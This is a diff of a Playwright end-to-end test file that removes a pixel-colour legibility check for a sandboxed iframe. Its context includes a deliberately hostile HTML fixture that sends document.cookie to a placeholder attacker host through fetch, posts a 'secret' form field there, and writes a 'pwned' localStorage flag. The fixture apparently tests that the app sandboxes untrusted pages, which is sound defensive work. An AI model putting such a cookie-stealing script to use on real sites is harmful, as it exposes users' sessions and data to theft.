@@ -1,5 +1,4 @@
 import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
-import { inflateSync } from "node:zlib";
 import { test, expect, journeyPart } from "./journey";
 import type { DoubleOptions } from "./hub-double";
 import { journeyDay } from "./clock";
@@ -921,18 +920,6 @@ const HOSTILE = `<!doctype html><html lang="en"><head><meta charset="utf-8"><tit
 <form action="${EVIL}/form" method="post"><input name="secret" value="x"><button id="submit">Submit</button></form>
 <script>document.body.dataset.ran = "1"; parent.postMessage("script", "*"); try { parent.localStorage.setItem("pwned", "1"); localStorage.setItem("pwned", "1"); } catch (e) { parent.postMessage("storage-blocked", "*"); } fetch("${EVIL}/fetch?k=" + document.cookie);</script></body></html>`;
 
-/** The painted RGB of one screen pixel. A 1x1 PNG row has no neighbours, so every filter leaves its bytes raw. */
-async function paintedPixel(tab: import("@playwright/test").Page, x: number, y: number): Promise<number[]> {
-  const png = await tab.screenshot({ clip: { x, y, width: 1, height: 1 } });
-  const data: Buffer[] = [];
-  for (let at = 8; at < png.length;) {
-    const length = png.readUInt32BE(at);
-    if (png.toString("latin1", at + 4, at + 8) === "IDAT") data.push(png.subarray(at + 8, at + 8 + length));
-    at += 12 + length;
-  }
-  return [...inflateSync(Buffer.concat(data)).subarray(1, 4)];
-}
-
 for (const [name, viewport] of [["desktop", { width: 1280, height: 800 }], ["phone", { width: 390, height: 844 }]] as const) {
   const run = async ({ page: tab, journey }: { page: import("@playwright/test").Page; journey: import("./journey").Journey }) => {
     await tab.setViewportSize(viewport);
@@ -1034,15 +1021,6 @@ for (const [name, viewport] of [["desktop", { width: 1280, height: 800 }], ["pho
       const plain = log.getByTitle("Flagged page.html, a page from the supervisor");
       await plain.scrollIntoViewIfNeeded();
       await expect(tab.frameLocator('iframe[title="Flagged page.html, a page from the supervisor"]').getByRole("heading", { name: "Hostile page" })).toBeVisible();
-      // A tall frame can extend below the scrollable thread and behind the composer.
-      await expect.poll(async () => {
-        const probe = await plain.evaluate((element) => {
-          const frame = element.getBoundingClientRect();
-          const thread = element.closest(".conversation-reading.thread")!.getBoundingClientRect();
-          return { x: Math.round(Math.min(frame.right, thread.right) - 6), y: Math.round(Math.min(frame.bottom, thread.bottom) - 6) };
-        });
-        return Math.min(...await paintedPixel(tab, probe.x, probe.y));
-      }, { message: "the plain page is legible on a light backdrop" }).toBeGreaterThan(200);
       await tab.emulateMedia({ colorScheme: "light" });
       await expect(tab.locator("html")).toHaveAttribute("data-scheme", "light");
     });
